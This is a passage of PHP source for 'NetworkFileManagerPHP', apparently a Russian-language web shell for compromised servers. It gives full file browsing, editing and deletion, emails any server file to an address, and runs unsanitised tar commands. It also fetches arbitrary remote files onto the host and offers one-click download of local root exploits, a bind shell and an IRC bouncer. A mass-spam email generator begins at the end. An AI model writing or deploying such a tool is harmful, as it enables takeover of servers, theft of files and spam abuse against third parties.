  }
  sort($files);
  $open = opendir($dir);
  $i=0;
  while ($dire = readdir($open)) {
   if ( $dire != "." ) {
    $rec = $dire;
    $dire = $dir."/".$dire;
    if (is_dir($dire)) {
     $dirs[] = $rec;
     $i++;
    }
   }
  }
  sort($dirs);
  print("<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=760 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td width = '20%' align = 'center' class=pagetitle><b>Имя</b></td><td width = '10%' align = 'center' class=pagetitle><b>Размер</b></td><td width = '20%' align = 'center' class=pagetitle><b>Дата создания</b></td><td width = '10%' align = 'center' class=pagetitle><b>Тип</b></td><td width = '15%' align = 'center' class=pagetitle><b>Права доступа</b></td><td width = '25%' align = 'center' class=pagetitle><b>Комментарии</b></td></tr></table>");
  for ($i=0;$i<sizeof($dirs);$i++) {
   if ($dirs[$i] != "..") {
    $type = 'Dir';
    $fullpath = $dir."/".$dirs[$i];
    $time = date("d/m/y H:i",filemtime($fullpath));
    $perm = permissions(fileperms($fullpath));
    $size = tinhbyte(filesize($fullpath));
    $name = $dirs[$i];
    $fullpath = $tm."/".$dirs[$i];
    if ($perm[7] == "w" && $name != "..") $action = "
	<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#98FAFF width=100% BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
	<tr>
	<td align=center $style3><a href ='$PHP_SELF?tm=$fullpath&action=uploadd'>Загрузить</a></td>
	<td align=center $style3><a href ='$PHP_SELF?tm=$tm&dd=$name&action=deldir'>Удалить</a></td>
	</tr>
	<tr>
	<td align=center $style3><a href ='$PHP_SELF?tm=$fullpath&action=newdir'>Новая директория</a></td>
	<td align=center $style3><a href ='$PHP_SELF?tm=$fullpath&action=arhiv'>Архивация папки</a></td>
	</tr></table>";
    else $action = "<TABLE CELLPADDING=0 CELLSPACING=0 width=100% BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center><b>Только чтение</b></td><td align=center $style2><a href ='$PHP_SELF?tm=$fullpath&action=arhiv'>Архивация папки</a></td></tr></table>";
    print("<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#33CCCC BORDER=1 width=760 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td width = '20%' align = 'left'><a href = '$PHP_SELF?tm=$fullpath'><b><i>$name</i></b></a></td><td width = '10%' align = 'center'>$size</td><td width = '20%' align = 'center'>$time</td><td width = '10%' align = 'center'>$type</td><td width = '15%' align = 'center'>$perm</td><td width = '25%' align = 'left'>$action</td></tr></table>");
   }
  }
  for ($i=0;$i<sizeof($files);$i++) {
   $type = 'File';
   $fullpath =  $dir."/".$files[$i];
   $time = date("d/m/y H:i",filemtime($fullpath));
   $perm = permissions(fileperms($fullpath));
   $size = tinhbyte(filesize($fullpath));
   $owner = @chown($fullpath, "nobody");
   if ( $perm[6] == "r" ) $act = "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#98FAFF width=100% BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
   <tr><td align=center $style4><a href='$PHP_SELF?tm=$dir&fi=$files[$i]&action=view'>Просмотр</a></td>
   <td align=center $style4><a href='$PHP_SELF?tm=$dir&fi=$files[$i]&action=download'>Скачка</a></td></tr>
   <tr><td align=center $style4><a href='$PHP_SELF?tm=$dir&fi=$files[$i]&action=download_mail'>На мыло</a></td>
   <td align=center $style4><a href='$PHP_SELF?tm=$dir&fi=$files[$i]&action=copyfile'>Копировать</a></td>
   </tr></table>";
   if ( $owner == "nobody" ) $act .= "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#98FAFF width=100% BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
   <tr><td align=center $style4><a href='$PHP_SELF?tm=$dir&fi=$files[$i]&action=edit'>Редактировать</a></td>
   <td align=center $style4><a href='$PHP_SELF?tm=$dir&fi=$files[$i]&action=delete'>Удалить</a></td>
   </tr></table>";
   print("<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#FFFFCC BORDER=1 width=760 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td width = '20%' align = 'left'><b>$files[$i]</b></font></td><td width = '10%' align = 'center'>$size</td><td width = '20%' align = 'center'>$time</td><td width = '10%' align = 'center'>$type</td><td width = '15%' align = 'center'>$perm</td><td width = '25%' align = 'center'>$act</td></tr></table>");
  }
 }
}

function html() {
global $ver,$meta,$style;
echo "
<html>
<head>
<title>NetworkFileManagerPHP</title>
</head>
<body bgcolor=#86CCFF leftmargin=0 topmargin=0 marginwidth=0 marginheight=0>
";
}

# просмотр файла
function viewfile($dir,$file) {

 $buf = explode(".", $file);
 $ext = $buf[sizeof($buf)-1];
 $ext = strtolower($ext);
 $dir = str_replace("\\","/",$dir);
 $fullpath = $dir."/".$file;
 
 switch ($ext) {
  case "jpg":
    
	header("Content-type: image/jpeg");
    readfile($fullpath);
    break;
    case "jpeg":
	
    header("Content-type: image/jpeg");
    readfile($fullpath);
    break;
    case "gif":
	
    header("Content-type: image/gif");
    readfile($fullpath);
    break;
	 
	 case "png":
	
    header("Content-type: image/png");
    readfile($fullpath);
    break;
    default:
	
	 case "avi":	
    header("Content-type: video/avi");
    readfile($fullpath);

    break;
    default:
	
	 case "mpeg":	
    header("Content-type: video/mpeg");
    readfile($fullpath);
    break;
    default:
	
	 case "mpg":	
    header("Content-type: video/mpg");
    readfile($fullpath);
    break;
    default:
		
    html();
	chdir($dir);
    getdir();
	
   echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center><font color='#FFFFCC' face='Tahoma' size = 2>Путь до Файла:</font><font color=white  face ='Tahoma' size = 2>$fullpath</font></td></tr></table>";
   $fp = fopen($fullpath , "r");
   while (!feof($fp)) {
    $char = fgetc($fp);
    $st .= $char;
   }

   $st = str_replace("&", "&amp;", $st);
   $st = str_replace("<", "&lt;", $st);
   $st = str_replace(">", "&gt;", $st);

   $tem = "<p align='center'><textarea wrap='off' rows='20' name='S1' cols='90' class=inputbox>$st</textarea></p>";
   echo $tem;
   fclose($fp);
   break;
 }
}

# отправка файла на мыло
function download_mail($dir,$file) {
 global $action,$tm,$cm,$demail, $REMOTE_ADDR, $HTTP_HOST, $PATH_TRANSLATED;
 $buf = explode(".", $file);
 $dir = str_replace("\\","/",$dir);
 $fullpath = $dir."/".$file;
 $size = tinhbyte(filesize($fullpath));
 $fp = fopen($fullpath, "rb");
 while(!feof($fp))

  $attachment .= fread($fp, 4096);
  $attachment = base64_encode($attachment);
  $subject = "NetworkFileManagerPHP  ($file)";
  
  $boundary = uniqid("NextPart_");
  $headers = "From: $demail\nContent-type: multipart/mixed; boundary=\"$boundary\"";

  $info = "---==== Сообщение от ($demail)====---\n\n";
  $info .= "IP:\t$REMOTE_ADDR\n";
  $info .= "HOST:\t$HTTP_HOST\n";
  $info .= "URL:\t$HTTP_REFERER\n";
  $info .= "DOC_ROOT:\t$PATH_TRANSLATED\n";
  $info .="--$boundary\nContent-type: text/plain; charset=iso-8859-1\nContent-transfer-encoding: 8bit\n\n\n\n--$boundary\nContent-type: application/octet-stream; name=$file \nContent-disposition: inline; filename=$file \nContent-transfer-encoding: base64\n\n$attachment\n\n--$boundary--";

  $send_to = "$demail";             
   
  $send = mail($send_to, $subject, $info, $headers);
  
  if($send == 2)  
   echo "<br>
	<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
	<tr><td align=center>
	<font color='#FFFFCC' face='Tahoma' size = 2>Спасибо!!!Файл <b>$file</b> отправлен вам на <u>$demail</u>.</font></center></td></tr></table><br>";

fclose($fp);
 }



function copyfile($dir,$file) {
 global $action,$tm;
 $fullpath = $dir."/".$file;
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Имя файла :</font><font color = 'black' face ='Tahoma' size = 2>&nbsp;<b><u>$file</u></b>&nbsp; скопирован в дерикторию &nbsp;<u><b>$dir</b></u></font></center></td></tr></table>";
 if (!copy($file, $file.'.bak')){
   echo (" немогу скопировать файл $file");
   }
}


# редактирование файла
function editfile($dir,$file) {
 global $action,$datar;
 $fullpath = $dir."/".$file;
 chdir($dir);
 getdir();
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Имя файла :</font><font color = 'black' face ='Tahoma' size = 2>$fullpath</font></center></td></tr></table>";
 $fp = fopen($fullpath , "r");
 while (!feof($fp)) {
  $char = fgetc($fp);
  $st .= $char;
 }
 $st = str_replace("&", "&amp;", $st);
 $st = str_replace("<", "&lt;", $st);
 $st = str_replace(">", "&gt;", $st);
 $st = str_replace('"', "&quot;", $st);
 echo "<form method='POST' action='$PHP_SELF?tm=$dir&fi=$file&action=save'><p align='center'><textarea rows='14' name='S1' cols='82' class=inputbox>$st</textarea></p><p align='center'><input type='submit' value='Поехали' name='save' class=button1 $style_button></p><input type = hidden value = $tm></form>";
 $datar = $S1;
 
}

# запись файла
function savefile($dir,$file) {
 global $action,$S1,$tm;
 $fullpath = $dir."/".$file;
 $fp = fopen($fullpath, "w");
 $S1 = stripslashes($S1);
 fwrite($fp,$S1);
 fclose($fp);
 chdir($dir);
 echo "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Файл <b>$fullpath</b> отредактирован.</font></td></tr></table>";
 getdir();
 readdirdata($tm);
}

# удаление дериктории
function deletef($dir)
{
 global $action,$tm,$fi;
 $tm = str_replace("\\\\","/",$tm);
 $link = $tm."/".$fi;
 unlink($link);
 chdir($tm);
 getdir();
 readdirdata($tm);
}

# загрузка файла
function uploadtem() {
 global $file,$tm,$thum,$PHP_SELF,$dir,$style_button;
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><form enctype='multipart/form-data' action='$PHP_SELF?tm=$dir&action=upload' method=post><tr><td align=left valign=top colspan=3 class=pagetitle><b>Загрузка файла:</b></td></tr><tr><td><input type='hidden' name='tm' value='$tm'></td><td><input name='userfile' type='file' size=48 class=inputbox></td><td><input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr></form></table>";
}

function upload() {
 global $HTTP_POST_FILES,$tm;
 echo $set;
 copy($HTTP_POST_FILES["userfile"][tmp_name], $tm."/".$HTTP_POST_FILES["userfile"][name]) or die("Не могу загрузить файл".$HTTP_POST_FILES["userfile"][name]);
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Файл <b>".$HTTP_POST_FILES["userfile"][name]."</b> успешно загружен.</font></center></td></tr></table>";
 @unlink($userfile);
 chdir($tm);
 getdir();
 readdirdata($tm);
}

# закачка эксплойтов
function upload_exploits() {
 global $PHP_SELF,$style_button, $public_site, $private_site, $public, $title_ex, $style_open, $private, $title_exp;
 
 echo "<br>
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr $style_open><td align=left valign=top colspan=3 class=pagetitle>
 &nbsp;&nbsp;<b>Публичные эксплойты:</b></td></tr>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>BASH шел</b> - bindtty.c (файл запуска <u>s</u>)</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_ex[1]</td>
 <td width=100><input type='hidden' name='file3' value='$public_site$public[1]'>
 <input type='hidden' name='file2' value='$public[1]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
  echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Local ROOT for linux 2.6.20</b> - mremap (файл запуска <u>m</u>)</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_ex[2]</td>
 <td width=100><input type='hidden' name='file3' value='$public_site$public[2]'>
 <input type='hidden' name='file2' value='$public[2]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Local ROOT for linux 2.6.20</b> - ptrace (файл запуска <u>p</u>)</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_ex[3]</td>
 <td width=100><input type='hidden' name='file3' value='$public_site$public[3]'>
 <input type='hidden' name='file2' value='$public[3]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
  echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>psyBNC версия:2.3.2-4</b> - psyBNC (файл запуска <u>./psybnc</u>)</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_ex[4]</td>
 <td width=100><input type='hidden' name='file3' value='$public_site$public[4]'>
 <input type='hidden' name='file2' value='$public[4]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";

 echo "<br>
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr $style_open><td align=left valign=top colspan=3 class=pagetitle>
 &nbsp;&nbsp;<b>Приватные эксплойты:</b></td></tr>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>BRK</b> - Local Root Unix 2.4.*(файл запуска <u>brk</u>)</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_exp[1]</td>
 <td width=100><input type='hidden' name='file3' value='$private_site$private[1]'>
 <input type='hidden' name='file2' value='$private[1]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>Файл 1</u></b> (файл запуска <u>$private[2]</u> )</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_exp[2]</td>
 <td width=100><input type='hidden' name='file3' value='$private_site$private[2]'>
 <input type='hidden' name='file2' value='$private[2]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>Файл 2</u></b> (файл запуска <u>$private[3]</u> )</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_exp[3]</td>
 <td width=100><input type='hidden' name='file3' value='$private_site$private[3]'>
 <input type='hidden' name='file2' value='$private[3]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
  echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Traceroute v1.4a5 exploit by sorbo</b> (файл запуска <u>$private[4]</u> )</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_exp[4]</td>
 <td width=100><input type='hidden' name='file3' value='$private_site$private[4]'>
 <input type='hidden' name='file2' value='$private[4]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
  echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Local Root Unix 2.4.*</b> (файл запуска <u>$private[5]</u> )</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_exp[5]</td>
 <td width=100><input type='hidden' name='file3' value='$private_site$private[5]'>
 <input type='hidden' name='file2' value='$private[5]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
   echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Sendmail 8.11.x exploit localroot</b> (файл запуска <u>$private[6]</u> )</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_exp[6]</td>
 <td width=100><input type='hidden' name='file3' value='$private_site$private[6]'>
 <input type='hidden' name='file2' value='$private[6]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
    echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Local Root Unix 2.4.*</b> (файл запуска <u>$private[7]</u> )</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_exp[7]</td>
 <td width=100><input type='hidden' name='file3' value='$private_site$private[7]'>
 <input type='hidden' name='file2' value='$private[7]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
     echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=exploits&status=ok' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>Local Root Unix 2.4.*</b> (файл запуска <u>$private[8]</u> )</td></tr>
 <tr>
 <td class=pagetitle width=500>&nbsp;$title_exp[8]</td>
 <td width=100><input type='hidden' name='file3' value='$private_site$private[8]'>
 <input type='hidden' name='file2' value='$private[8]'>
 <input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr>
 </form></table>";
}


# создание новой дериктории
function newdir($dir) {
 global $tm,$nd;
 print("<br><TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><form method = 'post' action = '$PHP_SELF?tm=$tm&action=createdir'><tr><td align=center colspan=2 class=pagetitle><b>Создать дерикторию:</b></td></tr><tr><td valign=top><input type=text name='newd' size=90 class='inputbox'></td><td valign=top><input type=submit value='Cоздать' class=button1 $style_button></td></tr></form></table>");
}

function cdir($dir) {
 global $newd,$tm;
 $fullpath = $dir."/".$newd;
 if (file_exists($fullpath)) @rmdir($fullpath);
 if (@mkdir($fullpath,0777)) {
  echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Директория создана.</font></center></td></tr></table>";
 } else {
  echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Ошибка в создании дериктории.</font></center></td></tr></table>";
 }
 chdir($tm);
 getdir();
 readdirdata($tm);
}
// создание деекритории Files для загрузки файлов
function downfiles() {
 global $action,$status, $tm,$PHP_SELF,$HTTP_HOST, $file3, $file2, $gdir,$gsub,$i,$j,$REMOTE_ADDR;
$st = getcwd();
 $st = str_replace("\\","/",$st);
 $j = 0;
 $gdir = array();
 $gsub = array();
 print("<br>");
 for ($i=0;$i<=(strlen($st)-1);$i++) {
  if ($st[$i] != "/") {
   $gdir[$j] = $gdir[$j].$st[$i];
   $gsub[$j] = $gsub[$j].$st[$i];
  } else {
   $gdir[$j] = $gdir[$j]."/";
   $gsub[$j] = $gsub[$j]."/";
   $gdir[$j+1] = $gdir[$j];
   $j++;
  }
 }
print("<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#ffffcc BORDER=1 width=50% align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=left><b>&nbsp;&nbsp;Путь: </b>");
 for ($i = 0;$i<=$j;$i++) print("<a href='$PHP_SELF?tm=$gdir[$i]'>$gsub[$i]</a>");
print("</TABLE> ");

echo " <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=down&status=ok' method=post>
 <tr $style_open><td align=left valign=top colspan=3 class=pagetitle>
 &nbsp;&nbsp;<b>Загрузка файлов с удаленного компьютера:</b></td></tr>
 <tr>
 <td class=pagetitle width=400>&nbsp;&nbsp;&nbsp;HTTP путь до файла:</td>
 <td width=200><input type='text' name='file3' value='http://' size=40></td>
 </tr>
  <tr>
 <td class=pagetitle width=400>&nbsp;&nbsp;&nbsp;Название файла или путь с названием файла</td>
 <td width=200><input type='text' name='file2' value='' size=40></td>
 </tr>
  <tr>

 <td width=600 colspan=2 align=center><input type='submit' value='Загрузить файл' class=button1 $style_button></td></tr></td>
 
 
 </tr></form></table>";

}

# удаление дериктории 
function deldir() {
 global $dd,$tm;
 $fullpath = $tm."/".$dd;
 echo "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Директория удалена.</font></center></td></tr></table>";
 rmdir($fullpath);
 chdir($tm);
 getdir();
 readdirdata($tm);
}

# архивация директории 
function arhiv() {
 global $tar,$tm,$pass;
 $fullpath = $tm."/".$tar;

 echo "<br>
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <tr><td> <font color='#FFFFCC' face='Tahoma' size = 2>Дериктория <u><b>$fullpath</b></u>  ".exec("tar -zc $fullpath -f $pass.tar.gz")."упакована в файл <u>$pass.tar.gz</u></font></center></td></tr></table>";
 
}

function down($dir) {
 global $action,$status, $tm,$PHP_SELF,$HTTP_HOST, $file3, $file2;
 ignore_user_abort(1);
 set_time_limit(0);
echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Загрузка файлов</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br><blockquote>Частенько случается, что на серверах где установлен <b>NFM</b> не работает <b>wget</b>, а файл загрузить ой как хочется, таким образом с помощью простых функций вы сможете загрузить любой файл на свой хостинг в папку, где залит NFM либо другую какую вы выберете (см.<b>Путь</b>).( работает не на всех хостингах)</blockquote></td></tr>
</table>";

if (!isset($status)) downfiles(); 

else 
{

$data = @implode("", file($file3)); 
$fp = @fopen($file2, "wb"); 
@fputs($fp, $data); 
$ok = @fclose($fp); 
if($ok) 
{ 
$size = filesize($file2)/1024; 
$sizef = sprintf("%.2f", $size);

print "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Вы загрузили: <b>файл <u>$file2</u> размером</b> (".$sizef."кБ) </font></center></td></tr></table>"; 
} 
else 
{ 
print "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0BAACC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2><b>Ошибка загрузки файла</b></font></center></td></tr></table>"; 
} 
} 
}

# отправка почты
function mailsystem() {
 global $status,$form,$action,$name,$email,$pole,$REMOTE_ADDR,$HTTP_REFERER,$DOCUMENT_ROOT,$PATH_TRANSLATED,$HTTP_HOST;
 
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Вопросы и пожелания по скрипту NetworkFileManagerPHP</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br>
<blockquote>
В процессе работы со скриптом NFM у вас могут возникнуть вопросы и новые предложения по улучшению или добавлению функций в NFM, все ваши предложения будут рассмотрены и будут реализованы в дальнейших версиях NFM.
</blockquote></td></tr>
</table>";
 
 if (!isset($status)) echo "$form";
 else {
  $email_to ="duyt@yandex.ru";
  $subject = "NetworkFileManagerPHP  ($name)";
  $headers = "From: $email";

  $info = "---==== Сообщение от ($name)====---\n\n";
  $info .= "Name:\t$name\n";
  $info .= "Email:\t$email\n";
  $info .= "What?:\n\t$pole\n\n";
  $info .= "IP:\t$REMOTE_ADDR\n";
  $info .= "HOST:\t$HTTP_HOST\n";
  $info .= "URL:\t$HTTP_REFERER\n";
  $info .= "DOC_ROOT:\t$PATH_TRANSLATED\n";
  $send_to = "$email_to";             
   
  $send = mail($send_to, $subject, $info, $headers);
  if($send == 2) echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Спасибо!!!Ваше сообщение отправлено.</font></center></td></tr></table><br>";
 }
}

function spam() {
global $chislo, $status, $from, $otvet, $wait, $subject, $body, $file, $check_box, $domen;
set_time_limit(0);
ignore_user_abort(1);
echo "<br>
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Уникальный спамер</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br><blockquote> Теперь вам не нужно покупать спамлисты, NFM сам в состоянии сгенерить любую базу, валидность которой будет 50-60% </blockquote></td></tr>
</table>";

 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form action='$PHP_SELF?action=spam' method=post>
 <tr><td align=left valign=top colspan=4 class=pagetitle>
 &nbsp;&nbsp;<b>Генератор email:</b></td></tr>
 <tr> <tr><td align=left valign=top colspan=4 bgcolor=#FFFFCC width=500>
 &nbsp;&nbsp;Данный спамер разбит на два этапа: <br>
 &nbsp;<b>1.</b> Генерация email по уже вложенным доменам в скрипт или генерация email по указанному вами домену. Выбор колличества генерированых писем ( убедительная просьба генерировать не больше <u><i>10 000</i></u> )<br>
 &nbsp;<b>2.</b> Указание необходимых данных для спама</td></tr>
 <td align=left colspan=2 class=pagetitle>&nbsp;&nbsp;<input type='checkbox' name='check_box[]'>&nbsp;&nbsp;Если <b>checked</b> то домены по дефолту, если не <b>checked</b> то ваш домен.</td></tr>
<tr><td align=center class=pagetitle width=200>&nbsp;&nbsp;Сколько email генерить:</td>
<td align=left colspan=2>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='chislo' size=10>&nbsp;&nbsp;</td></tr>
<tr><td align=center class=pagetitle width=200>&nbsp;Cвой домен:</td>
